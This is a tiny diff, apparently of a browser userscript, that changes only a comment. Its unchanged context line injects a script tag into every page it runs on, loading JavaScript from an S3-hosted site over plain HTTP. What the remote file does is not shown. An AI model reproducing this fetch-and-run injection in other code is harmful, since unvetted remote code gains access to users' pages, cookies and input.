@@ -20,6 +20,6 @@
 (function() {
     'use strict';
 
-    // Your code here...
+    // reuse...
     document.body.appendChild(document.createElement('script')).src='http://lgdata.s3-website-us-east-1.amazonaws.com/docs/1035/217629/proxywithga.js';
 })();
